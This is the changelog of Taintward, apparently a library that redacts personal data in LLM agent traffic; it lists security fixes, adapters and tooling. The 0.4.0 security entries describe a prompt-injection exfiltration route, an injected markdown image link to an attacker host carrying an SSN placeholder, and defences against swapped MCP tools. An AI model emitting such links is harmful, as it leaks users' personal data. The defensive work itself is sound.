# Changelog

## 0.4.0

### Security

- Tool call arguments and structured tool results in the chat history are
  now redacted in full before a model request. Fields named like protocol
  keys (`name`, `id`, `data`, `source`, `status`, ...) were skipped at any
  depth, so `{"name": "Alice Lee", "id": "234-12-1234"}` inside an Anthropic
  `tool_use.input`, a Gemini `function_response` or a dict tool result went
  to the model unredacted. Protocol keys are now skipped only where the
  protocol puts them. The text of an Anthropic plain text document
  (`source.type: text`) is redacted too. Python and TypeScript.
- Google ADK: function call arguments, function responses and a system
  instruction given as a `Content` are redacted in full.
- LlamaIndex: the arguments of a `ToolCallBlock` are redacted in full.
- Pydantic AI: a tool result that is a list of records (or any value that
  is not one string) is redacted; it used to be sent as it was. Text items
  next to an image or a file in a user prompt are redacted too.
- Two detections that only partly overlap are now redacted together. The
  second one used to be dropped, which left its tail in the text. Python
  (`redact_text`, `mask_text`, the control plane's upload masking) and
  TypeScript.
- `TAINTWARD_FAIL_CLOSED=1` now also refuses the call during which
  detection breaks (SDK and gateway). Before, only the calls after it were
  refused.
- MCP gateway: a request can no longer name the row that holds a client's
  taint (`client:<name>`) as its session id. A `DELETE` with that id cleared
  the taint kept per client (gap G4).
- The data block embedded in the HTML report writes `<` as `\u003c`.
- A value that makes a recognizer raise no longer switches redaction off.
  A 16-character string shaped like an Italian fiscal code with digits of
  another script (for example Arabic-Indic) raised inside the check digit
  code, and the whole payload it was in, with every SSN and email next to
  it, went out unchanged. The check is fixed, and any value a recognizer
  raises on is now masked whole (`UNSCANNED_VALUE`, `<UNSCANNED_1>` for the
  model) while the other values of the payload are scanned as usual. A
  Presidio pattern recognizer that raised on a payload used to be skipped
  for every value in it without a log line; it now runs on each value
  alone. An ERROR names the recognizer, never the text.
- TypeScript: the detector returned "nothing found" when a recognizer
  threw, so the value went out as it was. It is masked whole now, the same
  as in Python.
- TypeScript: `TAINTWARD_DETECT_MAX_CHARS` (default 500000, `0` = off), the
  same size limit as the Python SDK (gap G10). A longer value is masked
  whole (`OVERSIZE_VALUE`, `<TOO_LARGE_1>` for the model). There was no
  limit, and the email pattern was quadratic on long text with no `@`
  (80 KB of `1-1-1-...` took over 3 seconds); it is linear now.
- More link forms keep their placeholders (gap G1, Python and TypeScript):
  a host written without a scheme (`//attacker.example/?d=<SSN_1>`), a
  markdown reference definition (`[1]: ...`), an HTML attribute without
  quotes, and a link target or attribute that starts on the next line.
  Before, these were restored to the real value.
- An Enum member in a tool payload is now checked by its value. Before,
  only its name (`Contact.OWNER`) was checked, so a member whose value was
  an email or a key went through unredacted.
- A payload that contains itself now raises a clear `ValueError` instead of
  a `RecursionError`. It is still never passed on unchecked.
- Placeholders inside a link or image address in the model's answer are no
  longer restored (gap G1). An injected
  `![x](https://attacker.example/?d=<SSN_1>)` used to become an image
  request carrying the real SSN once the answer was rendered. They stay
  placeholders, are recorded as `taintward.placeholders.blocked`, and the
  check also follows links across stream chunks (Google ADK, LlamaIndex,
  TypeScript `StreamRestorer`). Python and TypeScript. Turn off with
  `placeholder_restore_in_urls=True`, `restoreInUrls: true` or
  `TAINTWARD_RESTORE_IN_URLS=1`.
- Report fingerprints are an HMAC-SHA256 with a secret key, 12 hex
  characters, instead of an unsalted SHA-256 that could be brute forced for
  SSNs (gap G6). `TAINTWARD_REPORT_KEY` keeps them stable across reports;
  without it each report has its own random key.
- `TAINTWARD_DETECT_MAX_CHARS` (default 500000): a longer value is not
  scanned and is masked whole, so a huge payload cannot hold a call for
  seconds (gap G10).
- `Redactor.reverse` and `tw.restore` are recorded: a `taintward.reverse`
  span event and a `taintward.audit` log line with the key id and the
  calling code, never the value (gap G11).
- Tool outputs are masked in the SDK also with `TAINTWARD_MASK_IN_SDK=0`,
  because the collector only masks regex types (gap G5).
- The collector's `taint_policy` processor has a `drop_attributes` option.
  By default it drops the Google ADK attributes that hold model requests,
  responses and tool arguments with real values.
- Gateway: tools are fingerprinted (description, title, schemas). A tool
  that differs from its pin in `tool_pins` or from the version first seen
  gets a `taintward.gateway tool_changed` span; `on_tool_change: hide` stops
  exposing it. `--print-tool-pins` writes the pins (gap G2).
- Gateway: two upstreams offering the same tool name stops the gateway at
  startup, and hides both tools if it happens later; it used to let the
  first upstream win. Rules that grant `internal` or `passthrough_args`
  without `upstream:` warn when there are several upstreams, and an unknown
  `upstream:` is a config error (gap G3).
- Gateway: `TAINTWARD_GATEWAY_TOKENS=name:token,...` gives each client its
  own token, and taint is kept per client as well as per session, so a new
  session does not start clean (gap G4). `client:` does the same over stdio.
- Collector: `trusted_services` in `taint_policy`. Spans from other
  services are treated as sensitive and their `taintward.args_redacted`
  marker is ignored (gap G7). The image includes the `bearertokenauth`
  extension; `collector/config.secure.yaml` and Helm `collector.auth`
  require a producer token, and the Helm routing tier and gateway send it.
- The sidecar config listens on `127.0.0.1:4319`, and `docker-compose.yml`
  publishes the collector and Jaeger ports on `127.0.0.1` only (gap G8).
- Anthropic's `messages.stream()` helper is patched on a protected client.
  It builds its own request instead of calling `messages.create`, so its
  request used to reach Anthropic unredacted. The request is now redacted
  when the `with` block starts, the events, `text_stream` and
  `get_final_message()` are restored, and the SDK's own span (content mode)
  gets no answer text. A JSON answer (`output_format`, `output_config`) is
  restored JSON-escaped, also for `messages.create(stream=True)`.
- The `parse()` helpers (OpenAI `chat.completions.parse` and
  `responses.parse`, Anthropic `messages.parse`) are patched on a protected
  client. They send their own request instead of calling `create`, so it
  used to reach the provider unredacted. The parsed answer is restored.
- LiteLLM: the caller gets a restored copy of a non-streamed answer, and
  the `TaintwardGuardrail` post-call hook returns one too. Restoring
  LiteLLM's own response object in place let its logging callbacks, which
  read it after the call returns, see the real values.

### Added

- Control plane for many tenants (`taintward-control`,
  docs/control-plane.md): each tenant's tool policy with every version kept
  (ETag, `If-Match`), span upload over OTLP/HTTP (JSON or protobuf, gzip)
  with raw values masked before storing, and per-tenant reports, audits,
  evidence log and inclusion proofs. The tenant comes from the API token;
  roles `agent`, `reader`, `admin`. With `TAINTWARD_CONTROL_URL` set,
  `tw.init()` takes the tool map from it, keeps it current
  (`TAINTWARD_CONTROL_REFRESH_SECONDS`), falls back to a cached copy
  (`TAINTWARD_CONTROL_CACHE`) and sends spans to it.
- Tenants: `tw.init(tenant=)` / `TAINTWARD_TENANT` records
  `taintward.tenant` on the resource and every span;
  `taintward-report --tenant`; shared SQLite, Postgres and Redis vaults keep
  each tenant's rows apart (`TenantVault`), and `taintward-keys reseal`
  only reseals the current tenant's rows.

- Offline data over-exposure audit (`taintward-audit`, docs/audit.md): from
  MCP tool definitions and the destination map, every path by which
  sensitive data could reach an outside sink (AgentRaft's function call
  graph, with rules instead of an LLM), which of them ran in recorded spans
  and with what outcome, and test prompts for the ones that never ran.

- Compliance mappings for GDPR, the EU AI Act, HIPAA and SOC 2
  (`taintward/evidence/compliance.py`, docs/compliance.md): each requirement
  with the controls that support it, how much (supports, partly, not
  covered) and the limits. `taintward-report --frameworks gdpr,hipaa` (or
  `all`) adds them as section 11, with the report's own numbers as evidence.

- KMS-only key mode (`TAINTWARD_KEYS_KMS_ONLY=1` or `"kms_only": true` in
  the ring): plain keys anywhere, the demo key and the random per-process
  key are refused. Scheduled rotation: keys record the day they were made,
  `taintward-keys rotate --if-older-than N [--reseal]` and `status
  --max-age N` (exit 1) for cron, rings in Vault KV can be rotated (written
  with check-and-set), `TAINTWARD_KEYS_RELOAD_SECONDS` lets running vaults
  pick up a rotated key, and the Helm chart has a `keyRotation` CronJob.

- TypeScript SDK: `protectOpenAI` and `protectAnthropic` for the official JS
  clients (chat, responses, `parse()` and `stream()` helpers, embeddings,
  Anthropic `messages.stream()`), streamed answers restored chunk by chunk;
  `taintwardEmbeddingMiddleware` for the AI SDK; Mastra agents through the
  middleware (tested). The detector has the Python rules for data outside
  the US (national ids with a check digit, ids after an id word,
  international phones, European addresses, inline passwords), checked
  against Python on 204 cases, and finds names after a title, label,
  greeting or sign-off or under a name key. Internal sinks can get FF1
  tokens (`internal: "token"`), the same tokens as Python for the same key.

- Embeddings and RAG ingestion (destination `rag`, masked): `protect_openai`
  covers `client.embeddings.create`, `protect_litellm` covers
  `litellm.embedding` / `aembedding`, and new `protect_langchain_embeddings`,
  `protect_langchain_vectorstore`, `protect_llamaindex_embedding`,
  `llamaindex_redact_nodes` and `redact_for_rag`. Spans record how many
  vectors there were and their size, never the vectors.

- Streamed answers are restored in Python: OpenAI and Anthropic
  `stream=True` (and the OpenAI `chat.completions.stream()` /
  `responses.stream()` helpers), LangChain `stream()` / `astream()`,
  Pydantic AI `run_stream`, LiteLLM `stream=True` and the LiteLLM proxy
  guardrail. A placeholder split across chunks is restored whole: each text
  holds back at most 64 characters while they may be the start of a
  placeholder. Tool call arguments are restored as JSON, and so is the text
  of a JSON answer (`response_format`). The SDK's own stream object is
  returned and its chunks are restored copies; the provider's chunk objects
  keep the placeholders (LiteLLM's logging callbacks read them). The span
  stays open until the stream ends, then records the answer (placeholder
  version) and checks it; strict mode raises after the last chunk.
- `PlaceholderMap.restore_json_fragment()` and
  `placeholders.StreamRestorer` (the Python version of the TypeScript one).
- Detection outside US formats (gap G9). Text in another language goes to
  spaCy's multilingual model `xx_ent_wiki_sm` when it is installed
  (`python -m spacy download xx_ent_wiki_sm`; pick another one with
  `TAINTWARD_NER_MULTILINGUAL_MODEL`, or `off`). New rules: phone numbers
  with a `+` country code, or after a phone word in English, German,
  French, Spanish, Italian, Dutch or Swedish; street addresses in the usual
  European forms, joined with the postal code and city after them; national
  ids with a check digit (Indian Aadhaar and PAN, Italian codice fiscale,
  Spanish DNI / NIE, French NIR, Swiss AHV, UK National Insurance number);
  any id right after an id word ("Passnummer", "numéro de passeport",
  "Codice fiscale") or under an id key (`passport_number`, `tax_id`), never
  the plain word "id"; passwords and API keys written inline ("Passwort:
  ...", `<password>...</password>`). On the held-out outside data strict
  recall went from 0.36 to 0.51 and from 0.50 to 0.60 (`docs/benchmark.md`).
- `detect.health()` has a `multilingual_model` field.
- CI job `detection-bench` runs the outside-data benchmark and fails when a
  score drops under its floor. `bench/external/run_external.py --split dev`
  gives rows that are never in the reported sample, for tuning rules.

### Changed

- `taintward.sdk` loads `detect`, `instrumentation` and `taint` on first use,
  and `ToolPolicy` lives in `taintward.sdk.destinations` (still importable
  from `taintward.sdk.integrations`), so the control plane and the audit
  do not load the detectors.

- A place name with nothing else sensitive in the same value ("I flew to
  Berlin") no longer counts as PII. Next to a name, id, phone number or
  email it still does, and street addresses always do. On outside
  documents this took false alarms from 62% to 44%. `TAINTWARD_LOCATION_ALONE=1`
  or `detect.set_location_alone(True)` brings the old rule back.
- Fewer false name hits: greeting and form label words ("Bitte",
  "Numéro"), template slots (`[City]`), words that are also written in lower
  case in the same text ("Policy" ... "policy"), spaCy stop words
  ("Unsere", "Estoy") and hits that start with a pronoun ("Meine Gedichte")
  are dropped. False alarms on short outside texts went from 26% to 15%.
- A UK NHS number is only flagged with its context word nearby: on outside
  data the ten-digit check fired mostly on phone numbers.
- More US street types from the USPS list (Junction, Creek, Crossing, ...).
- An id found after an id word wins over a phone number guess on the same
  characters, and gives way to a recognizer that knows the exact format.
- The LiteLLM proxy guardrail sends placeholders for streaming requests too
  (it used to send masks, because it could not restore a stream).
- LlamaIndex and Google ADK streams go through the same restorer, so a
  placeholder split across two deltas is restored in the deltas too, not
  only in the final text. Their chunks are restored copies, and the span
  records the placeholder version of the streamed answer.
- Pydantic AI `request_stream` keeps its span in a private context, so it
  no longer logs "Failed to detach context" when Pydantic AI ends the stream
  in another task.

### Fixed

- TypeScript `StreamRestorer`: a double bracket form (`{{PERSON_1}}`,
  `[[PERSON_1]]`) cut between its two closing brackets was restored too
  early and left a stray bracket. In streamed tool call arguments, the
  check for link addresses (gap G1) now looks only at the JSON string the
  placeholder is in, so a link in another argument no longer keeps a
  placeholder unrestored.

### Fixed

- `allow: to` (one name instead of a list) in a tool policy means the
  argument `to`, not the letters `t` and `o`.
- `TAINTWARD_RESTORE_IN_URLS` accepts the same on/off words as every other
  flag (`on`, `off`, ...).
- `taintward-gateway` prints one clear line for a missing, unreadable or
  invalid config instead of a traceback, and reports its real version.
- A policy from the control plane that the SDK cannot read no longer stops
  the background refresh.
- `frameworks=eu_ai_act` is accepted for `eu-ai-act`.
- `taintward-keys rotate` prints the right `retire` command for a ring in
  Vault KV.
- Checkpoint verification reports a malformed shard entry instead of
  stopping with an error.
- `taintward-evidence record` into a single-file log now uses
  `--clickhouse-url`, `--clickhouse-container`, the user and password
  flags and every `--service` (it used `docker exec` and the first service
  only), and records calls flagged by the SDK as well as by the collector,
  the same as with `--evidence-dir`. `--checkpoint` without
  `--evidence-dir` is an error instead of being ignored.
- `taintward-evidence`, `taintward-report`, `taintward-audit` and
  `taintward-fix` print one `error:` line for a trace source that cannot
  be reached, a bad `--since`, a missing file or a file that does not
  parse, instead of a traceback.
- The compliance table in a report said "verification failed" for an
  evidence log that was not checked (no `--public-key`, or a single-file
  log). It now says "not verified in this report".
- `taintward-fix` finds calls made on a client object
  (`client.chat.completions.create`, `client.responses.create`,
  `client.messages.create`, also `.parse`, `.stream` and
  `.embeddings.create`); it only knew names with `openai` or `anthropic`
  in them. A client wrapped with `protect_openai` or `protect_anthropic`
  in the same file is not reported. The suggested fix uses the current
  names.
- `taintward-audit --tools` reads a saved JSON-RPC response
  (`{"result": {"tools": [...]}}`); it used to find no tools in it.
- Detection is much faster on text full of numbers. The phone matcher ran
  over the whole value although its hits only count next to a phone word
  or under a phone key; it now runs only on those parts. 80 KB of spaced
  digits went from 1.9 s to 0.17 s, 500 KB from 12 s to 1 s. The
  detections are the same (checked on 10,000 texts).
- `taintward-report` and `taintward-evidence record` no longer fall back
  to the demo service name `taintward-hr-bot`. `--source jaeger` without
  `--service` is an error, and ClickHouse or OTLP files without
  `--service` read every service.

### Release

- The collector and gateway images and the Helm chart are now published to
  `ghcr.io/dcchoudhury15/taintward` by the GitHub release workflow. The
  chart and the Kubernetes guide pointed at a registry that was never
  filled, so `helm install` could not pull its images. The unused GitLab
  pipeline files are removed. Images and chart are not signed.

## 0.3.0

### Added

- Adapters for CrewAI (`wrap_crewai_tools`, `protect_crewai_llm`),
  LlamaIndex (`wrap_llamaindex_tools`, `protect_llamaindex_llm`), Pydantic AI
  (`wrap_pydantic_ai_tools`, `wrap_pydantic_ai_toolset`,
  `protect_pydantic_ai_model`), Google ADK (`wrap_adk_tools`,
  `protect_adk_model`) and LiteLLM (`protect_litellm` for the SDK,
  `TaintwardGuardrail` for the proxy). Same gate as the other adapters:
  tools get what their destination allows, the model gets placeholders and
  its answer is restored. Extras `crewai`, `llamaindex`, `pydantic-ai`,
  `google-adk`, `litellm`; tests run each framework's own agent loop with a
  scripted model, in a new `adapter-tests` CI job pinned by
  `constraints-adapters.txt`.
- Key rings and rotation (`taintward/sdk/keys.py`, `docs/key-management.md`):
  `TAINTWARD_KEYS` loads FPE and vault keys from a JSON file or HashiCorp
  Vault KV, with keys optionally wrapped by AWS KMS, GCP KMS or Vault
  Transit. Vault rows now name the key that sealed them; old rows still
  open. New `taintward-keys` command: `rotate`, `reseal` (re-encrypt vault
  rows under the active key, SQLite, Postgres and Redis), `retire`,
  `generate`, `show`. Erasure finds rows under every key in the ring.
  New extras `aws` and `gcp`. Tested against real Vault and LocalStack.
- TypeScript SDK in `packages/taintward-js` (npm name `taintward`):
  `taintwardMiddleware()` for the Vercel AI SDK sends placeholders to the
  model and restores real values in text, reasoning and tool call
  arguments, also when streamed. Same detector rules as Python (checked
  case by case against it), tolerant restore of rewritten placeholders,
  the placeholder instruction line and strict mode. No name detection.

- `docs/threat-model.md`: trust boundaries, assets, what is prevented,
  detected or not handled for each attacker, known detection bypasses,
  STRIDE per component, 11 open gaps (G1 to G11) and a deployment hardening
  checklist. Every claim points to the code and test behind it.
- `bench/external/`: detection measured on two public labeled PII datasets
  (ai4privacy, gretel finance multilingual). Results in
  `bench/results/external_*` show value shapes only, never dataset text.
  Summary in "Results on outside data" in `docs/benchmark.md`.
- Documentation site (mkdocs-material, `mkdocs.yml`): concepts, guides,
  recipes, configuration, span attribute, command line and Python API
  reference, operations and security pages. `mkdocs build --strict` runs in
  CI, and `.github/workflows/docs.yml` publishes it to GitHub Pages from
  main.

### Changed

- The README is shorter, with the key numbers at the top.

- README and SECURITY.md say that the 0% false alarm and 0.94 recall numbers
  are from the synthetic benchmark, and link the outside-data results and
  the threat model.
- Links on the site, quickstart, SECURITY.md and CONTRIBUTING.md point to
  the GitHub repo. Security reports go to GitHub private advisories, with the
  GitLab confidential issue as a fallback.

## 0.2.0

First release under the name Taintward. The project was called AgentWard
before; the PyPI name `agentward` belongs to another company, so everything
was renamed.

### Renamed

- One Python package, `taintward`, holds `sdk`, `core`, `evidence`,
  `fix_suggester` and `gateway`. `import taintward as tw` gives the
  integrations API: `tw.init`, `tw.run`, `tw.wrap_langchain_tools`,
  `tw.protect_langchain_model`, `tw.wrap_function_tools`, `tw.protect_openai`,
  `tw.protect_anthropic`, `tw.restore`, `tw.health`.
- PyPI name `taintward`. Commands: `taintward-report`, `taintward-gateway`,
  `taintward-evidence`, `taintward-fix`.
- Environment variables `AGENTWARD_*` are now `TAINTWARD_*`.
- Span attributes `agentward.*` are now `taintward.*` in the SDK, the
  gateway, the collector processor, the Rego package (`package taintward`),
  the report, the dashboards and the Helm chart.
- Go module `github.com/DCchoudhury15/taintward/...`, collector binary and
  images `taintward-collector`, `taintward-gateway`, `taintward-demo`.
- Helm chart in `deploy/helm/taintward`. The gateway Dockerfile moved to
  `deploy/gateway.Dockerfile`.
- There are no compatibility aliases for the old names.

### Added

- Packaging: every runtime package ships; extras `mcp`, `langchain`,
  `openai-agents`, `llm`, `postgres`, `redis`. CI for GitLab and GitHub.
- FF1 format-preserving encryption, checked against the NIST sample vectors.
- Token vault with AES-256-GCM encryption at rest: memory, SQLite, Postgres
  and Redis backends, with per-subject erasure for GDPR.
- MCP gateway over stdio and HTTP (`--listen`) with redact, block and audit
  modes per tool, and Redis session storage for several replicas.
- Framework adapters for LangChain, LangGraph, the OpenAI Agents SDK and the
  OpenAI and Anthropic clients.
- Placeholders for the LLM: the model gets `<PERSON_1>`, `<SSN_1>` and the
  caller gets the real values back.
- Compliance report (`taintward-report`), a sharded evidence log with
  Ed25519 signed checkpoints, RFC 9162 inclusion and consistency proofs, and
  repair after a crash.
- Docker compose quickstart with Jaeger, a Helm chart (tested on kind) and
  load tests for the collector, the SDK and the gateway.
- Detection health: `tw.health()` reports `full`, `regex_only` or `broken`.
- `TAINTWARD_FAIL_CLOSED=1`: refuse calls to non-internal sinks while
  detection is degraded (SDK and gateway).
- `taintward.args_redacted` span attribute: the stored tool arguments are
  already redacted, so the collector keeps them (and their reversible
  tokens) as they are.
- `taintward.taint.source_span` now names the span that first found the
  data, and the source span rides in baggage.

### Changed

- Detection is much faster: a wrapped 1 KB tool call went from 518 ms to
  8.4 ms (p50), and false alarms on clean payloads went from 48% to 0% on
  the benchmark. See `docs/benchmark.md`.
- Collector processor: fails closed, scans all span data, has more secret
  patterns and caches policy decisions.
- If spaCy or Presidio fail to load, detection logs one ERROR and falls back
  to regex-only detection instead of finding nothing.
- Run state (`begin_run` / `end_run`, `tw.run`) lives in context variables:
  runs in concurrent asyncio tasks no longer mix, and nested runs work.

### Fixed

- Numbers and other non-string values (an SSN stored as an int, an object
  whose `str()` holds an SSN) reached tools and spans raw. They are now
  checked in their string form and redacted.
- Dict keys were never scanned. They are now scanned and redacted, and
  redacted keys are kept unique.
- namedtuples became plain tuples, and masking one raised an error. They
  keep their type now; sets, frozensets and dict subclasses too.
- `AGENTWARD_DRY_RUN=0` turned dry run on. All on/off settings now use one
  parser: on for `1`, `true`, `yes`, `on`, off for `0`, `false`, `no`, `off`.
- Taint from a wrapped tool called inside another wrapped tool could be
  lost, so a later external call recorded no violation.
- A tool that raised recorded no violation, and the exception message
  reached the span raw. The violation is recorded now and the exception
  message and stack trace are masked.
- The Helm chart shipped an older copy of the Rego policy.
